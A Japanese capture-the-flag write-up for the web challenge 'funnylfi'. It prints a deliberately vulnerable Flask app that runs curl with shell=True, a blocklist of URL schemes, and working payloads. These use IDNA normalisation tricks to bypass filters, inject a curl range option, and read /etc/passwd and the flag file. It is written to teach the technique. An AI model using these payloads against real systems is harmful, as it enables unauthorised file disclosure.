# funnylfi

## 所感
テーマが国際化ドメイン名 (IDN) の問題なのでWebに分類しましたが、Miscのパズル感も強いです。
国内のWeb・Miscのトップ層を3時間足止めできればと作りました。
SECCONのeasylfiをリスペクトしています。

## 解法
クエリパラメータ `?url=` で指定したページを表示するようで、IDNにも対応している。
配布された `app.py` の主要部分は以下のとおりである。
```python
# Multibyte Characters Sanitizer
def mbc_sanitizer(url :str) -> str:
    bad_chars = "!\"#$%&'()*+,-;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c"
    for c in url:
        try:
            if c.encode("idna").decode() in bad_chars:
                url = url.replace(c, "")
        except:
            continue
    return url


# Scheme Detector
def scheme_detector(url :str) -> bool:
    bad_schemes = ["dict", "file", "ftp", "gopher", "imap", "ldap", "mqtt",
                   "pop3", "rtmp", "rtsp", "scp", "smbs", "smtp", "telnet", "ws"]
    url = url.lower()
    for s in bad_schemes:
        if s in url:
            return True
    return False


# WAF
@app.after_request
def waf(response: Response):
    if b"RicSec" in b"".join(response.response):
        return Response("Hi, Hacker !!!!")
    return response


@app.route("/")
def funnylfi():
    url = request.args.get("url")
    if not url:
        return "Welcome to Super Secure Website Viewer.<br>Internationalized domain names are supported.<br>ex. <code>?url=ⓔxample.com</code>"
    if scheme_detector(url):
        return "Hi, Scheme man !!!!"
    try:
        proc = subprocess.run(
            f"curl {mbc_sanitizer(url[:0x3f]).encode('idna').decode()}",
            capture_output=True,
            shell=True,
            text=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "[error]: timeout"
    if proc.returncode != 0:
        return "[error]: curl"
    return proc.stdout
```
内部では、 `encode("idna").decode()` したURL (0x3fの制限あり) を `subprocess.run` で `curl` にそのまま渡している。
配布ファイル `flag` があることや、問題名からもゴールはLFIだと考えられる。
配布ファイル `Dockerfile` から `/var/www/flag` にフラグが書かれていることがわかる。
Scheme Detector、Multibyte Characters Sanitizer、WAFの三種類のチェックがあるのでこれらをバイパスしてフラグを読みだせばよい。

### Scheme Detectorの突破
ローカルのファイルを `curl` にて読み取るにあたり、スキーム `file://` が利用できる。
ただし、入力されたURLのスキームを検証しているScheme Detectorを突破しなければならない。
Scheme Detectorは以下のとおりである。
```python
# Scheme Detector
def scheme_detector(url :str) -> bool:
    bad_schemes = ["dict", "file", "ftp", "gopher", "imap", "ldap", "mqtt",
                   "pop3", "rtmp", "rtsp", "scp", "smbs", "smtp", "telnet", "ws"]
    url = url.lower()
    for s in bad_schemes:
        if s in url:
            return True
    return False
```
`url.lower()` により大文字 (ex. `File://` ) による突破は難しそうだ。
さらに、 `curl` の対応スキーム全てをチェックしており、比較の不備もなさそうに見える。
ここで、処理の流れとして、Scheme Detectorの後の `curl` に渡されるタイミングで、 `encode("idna").decode()` が行われることに気付く。
つまり、Scheme Detectorを通り抜け、 `encode("idna").decode()` によって `file://` に変化する文字を使用すればよい。
サイト内の例にある `ⓔxample.com` からも分かるように `ⓔ` などは `e` に変換される。
この仕組みを使うことで、以下のようにScheme Detectorを突破することが可能となる。
```bash
$ curl 'http://localhost:31415?url=file:///var/www/flag'
Hi, Scheme man !!!!
$ curl 'http://localhost:31415?url=filⓔ:///var/www/flag'
Hi, Hacker !!!!
$ curl 'http://localhost:31415?url=filⓔ:///etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
~ 略 ~
```
無事に内部のファイルは読み取れたようだが、 `/var/www/flag` はWAFにブロックされている。

### WAFの調査
WAFは単純な構成で、以下のとおりである。
```python
# WAF
@app.after_request
def waf(response: Response):
    if b"RicSec" in b"".join(response.response):
        return Response("Hi, Hacker !!!!")
    return response
```
`curl` にて読み取った内容に文字列 `RicSec` が含まれている場合にブロックされているようだ。
実装に不自然な箇所はないので、文字列を変更するなど正攻法でWAFを突破する必要があるとわかる。

### Multibyte Characters Sanitizerの突破
Scheme Detectorを突破できたが、さらにMultibyte Characters Sanitizerの突破を試みる。
Multibyte Characters Sanitizerは以下のとおりである。
```python
# Multibyte Characters Sanitizer
def mbc_sanitizer(url :str) -> str:
    bad_chars = "!\"#$%&'()*+,-;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c"
    for c in url:
        try:
            if c.encode("idna").decode() in bad_chars:
                url = url.replace(c, "")
        except:
            continue
    return url
```
内部では `encode("idna").decode()` により、入力されたURLを一文字ずつASCII文字 (ACE) へ変換し、禁止された特殊文字 `bad_chars` に含まれていないことをチェックしている。
`ⓔ` が `e` に変換されたように、Multibyte Characters Sanitizerのチェックをすり抜けて、 `curl` のタイミングでの `encode("idna").decode()` で特殊文字になる非ASCII文字はないだろうか？
もし記号が使用できる場合は、LFIといわずOSコマンドインジェクションの可能性がある。
以下は、Multibyte Characters Sanitizerをパスしたが、再度 `curl` のタイミングでの `encode("idna").decode()` により `bad_chars` が含まれる入力を探すスクリプトである。
これを用いて雑にMultibyte Characters Sanitizerの挙動を調査する。
```python
for i in range(0xffff):
    try:
        ensc = mbc_sanitizer(chr(i)).encode("idna").decode()
        for c in "!\"#$%&'()*+,-;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c":
            if c in ensc:
                print(f"{i}: {ensc}")
                break
    except:
        continue
```
実行すると以下のとおりとなる。
```text
161: xn--7a
162: xn--8a
163: xn--9a
164: xn--bba
165: xn--cba
166: xn--dba
167: xn--eba
168: xn-- -ccb
169: xn--gba
171: xn--iba
~ 略 ~
```
ACEのPrefixである `xn--` の記号 `-` がヒットしてしまっているようだ。
記号 `-` は `bad_chars` に含まれているため、本来ブロックされるべきである。
この結果より、Multibyte Characters Sanitizerでは `encode("idna").decode()` の結果が複数文字になるケースが考慮されていないことがわかる。
ここで、 `xn-- -ccb` に謎のスペースが入っているという不審な点に気付く。
これはUCDの[NormalizationTest.txt](https://www.unicode.org/Public/UCD/latest/ucd/NormalizationTest.txt)にもあるように、正規化後にスペース (0x20) が含まれることが原因のようだ。
`curl` 実行部分では `subprocess.run` が `shell=True` で呼び出されており、URLがそのまま渡っているため、スペースで分割される場合には `-ccb` がオプションと解釈されることがわかる。
`curl` に `-ccb` のオプションがあるかは不明だが、この箇所を上手く指定してやればファイルを外部に送信することなどが可能かもしれないとひらめく。
幸いなことに実行結果からスペースが含まれる文字種は多数あることもわかる。

さらにPrefixを除いたものを探すため、 `bad_chars` が含まれる入力を探すスクリプトの `if c in ensc:` を `if c in ensc and not "xn--" in ensc:` へ変更し再度実行する。
```
8252: !!
8263: ??
8264: ?!
8265: !?
9332: (1)
9333: (2)
~ 略 ~
9397: (z)
10868: ::=
10869: ==
10870: ===
```
`‼` などACEに変換した際に複数文字になるものがいくつか得られた。
これらの記号はMultibyte Characters Sanitizerにブロックされないため、URLとして利用可能なようだが、残念ながらOSコマンドインジェクションは難しそうである。

### WAFの突破
Multibyte Characters Sanitizerの突破により、 `curl` に任意のオプションを渡せる可能性があることがわかった。
ここで `curl` に渡すことでWAFの突破や外部へのファイル送信が可能となるオプションを探す。
マニュアルを見ると `-F` でファイル送信が可能であるようだが、 `encode("idna").decode()` の結果が全て小文字であることより利用できない。
小文字のオプションに絞って探すと `-r` により、バイトのRangeを指定できるようであり、 `file://` にも利用できるようだ。
manにも以下のとおりに書かれている。
```
-r, --range <range>
    (HTTP FTP SFTP FILE) Retrieve a byte range (i.e. a partial document) from  an  HTTP/1.1,  FTP  or  SFTP server or a local FILE. Ranges can be specified in a number of ways.
```
これを用いて `-r1` や `-r2` のような `-rX` の形をオプションとして渡すことができれば、 `RicSec` の先頭が読み飛ばされるのでWAFを突破できる。ここで `encode("idna").decode()` が文字列に対してどのような挙動を示すかを詳細に調査する。
```python
$ python
>>> f"{chr(168)}".encode("idna").decode()
'xn-- -ccb'
>>> f"A{chr(168)}".encode("idna").decode()
'xn--a -vub'
>>> f"B{chr(168)}".encode("idna").decode()
'xn--b -vub'
>>> f"AA{chr(168)}".encode("idna").decode()
'xn--aa -fec'
>>> f"AAA{chr(168)}".encode("idna").decode()
'xn--aaa -ywc'
>>> f"AAA{chr(168)}A".encode("idna").decode()
'xn--aaa a-hgd'
>>> f"filⓔ:///var/www/flag{chr(168)}".encode("idna").decode()
'xn--file:///var/www/flag -6wl'
```
文字列の内容にではなく長さに依存することが分かる (厳密には `chr(168)` の位置) 。
また、先頭にPrefixである `xn--` が、末尾にオプション (となる)  `-6wl` が付加されるようである。
これにより、 `filⓔ://` の前に `xn--` が付加されるため、スキームが壊れる問題が発生する。
ただし、Prefixは各サブドメインの先頭に付加される仕様であるため、以下のとおり `.` を挿入してやればスキームを壊すことなくオプションを渡すことができる。
```python
$ python
>>> f"filⓔ:///var/www/flag.{chr(168)}".encode("idna").decode()
'file:///var/www/flag.xn-- -ccb'
```
最後に問題となるのはファイル名である。
`/var/www/flag` を読み取りたいが、スキームを壊さないために挿入した `.` やPrefixである `xn--` など余計なものが付いた結果、 `var/www/flag.xn--` になってしまっている。
ここでさらに、 `file://` にクエリを付けても良いことを思い出す。
以下のとおりに実際の環境で試してみる。
```bash
$ curl file:///etc/passwd?satoki
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
~ 略 ~
```
ただし、 `?` は `bad_chars` として禁止されている。
ここで、Multibyte Characters Sanitizerの突破において、利用可能な記号を調査した際の出力に `8263: ??` があったことを思い出す。
これを `?` として利用できないだろうか？
以下のとおり試す。
```python
$ python
>>> f"filⓔ:///var/www/flag{chr(8263)}.{chr(168)}".encode("idna").decode()
'file:///var/www/flag??.xn-- -ccb'
```
上手く `?` として機能しているようだ。
最後にオプションを `-rX` の形にする必要がある。
実際は厳密に計算できるのだが、今回は総当たりを試みる。
文字列の内容にではなく長さに依存することより、文字数を増やしながらスペースが含まれる文字を探索する。
```python
for i in range(0x3f):
    for j in range(0xffff):
        try:
            url = f"filⓔ:///var/www/flag{chr(8263)}.{'a'*i}{chr(j)}".encode("idna").decode()
            if (" " in url) and ("r" in url.split(" ")[1]):
                print(url)
                print(f"filⓔ:///var/www/flag{chr(8263)}.{'a'*i}{chr(j)}")
        except Exception as e:
            #print(e)
            continue
```
実行すると大量の結果のうち、以下の出力が得られる。
```text
file:///var/www/flag??.xn--aaaaaaaaaaaaaaaaaaaaa -r1m
filⓔ:///var/www/flag⁇.aaaaaaaaaaaaaaaaaaaaa˛
```
`-r1` が上手く出てきている。
以下のとおりこれを投げてやれば、WAFを突破してflagが取得できる。
```bash
$ curl 'http://localhost:31415?url=filⓔ:///var/www/flag'
Hi, Hacker !!!!
$ curl 'http://localhost:31415?url=filⓔ:///var/www/flag⁇.aaaaaaaaaaaaaaaaaaaaa˛'
icSec{mul71by73_ch4r4c73r5_5upp0r7_15_4_lurk1n6_vuln3r4b1l17y}
```

## RicSec{mul71by73_ch4r4c73r5_5upp0r7_15_4_lurk1n6_vuln3r4b1l17y}














